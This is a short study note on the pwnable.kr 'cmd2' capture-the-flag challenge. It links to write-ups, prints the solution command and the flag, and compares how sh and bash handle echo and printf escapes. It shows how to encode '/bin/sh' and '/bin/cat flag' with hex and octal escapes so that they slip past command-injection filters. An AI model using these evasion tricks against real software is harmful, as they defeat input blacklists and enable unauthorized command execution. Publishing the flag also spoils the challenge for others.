---
sort : 1
---


# SH 

https://n1ght-w0lf.github.io/binary%20exploitation/cmd2/

https://github.com/victor-li/pwnable.kr-write-ups/blob/master/cmd2.md

https://medium.com/@clong/pwnable-kr-cmd1-cmd2-writeups-e6980fa8daca


```
$ ./cmd2 “command -p cat \”f\”\”l\”\”a\”\”g\””
command -p cat “f””l””a””g”
FuN_w1th_5h3ll_v4riabl3s_haha
```













## sh vs. bash 

bash is sh, but with more features and better syntax.

`sh` is implemented by programs like `dash`, `kash`, and original `Bourne Shell`


```note
It is not possible to use `echo` portably across all POSIX systems unless both -n (as the first argument) and escape sequences are omitted. The `printf` utility can be used portably to emulate any of the traditional behaviors of the echo
```


> Ex

sh : 
```sh 
$ echo $'\x2f\x62\x69\x6e\x2f\x73\x68'
#	\x2f\x62\x69\x6e\x2f\x73\x68

$ echo -e \\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68
#	-e \x2f\x62\x69\x6e\x2f\x73\x68

$ printf "%b" '\x2f\x62\x69\x6e\x2f\x73\x68'
#	\x2f\x62\x69\x6e\x2f\x73\x68
```

bash :
```bash
$ echo $'\x2f\x62\x69\x6e\x2f\x73\x68'
#	/bin/sh

$ echo -e \\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68
#	/bin/sh

$ printf "%b" '\x2f\x62\x69\x6e\x2f\x73\x68'
#	/bin/sh
```

```tip
some times using echo in some OS command injection attacks - through for example `system()` function in C - won't work !! 

because system() forks a new process and run the passed command inside `sh` environment, `execl("/bin/sh", "sh", "-c", command, (char *) NULL);`
```

sh :
```sh              
$ printf "%bbin%bcat %s%s" "\57" "\57" "fl" "ag"
#	/bin/cat flag$														finally !! 
```

bash :
```bash
printf "%bbin%bcat %s%s" "\57" "\57" "fl" "ag"
#	\57bin\57cat flag                                                                                                                    
```
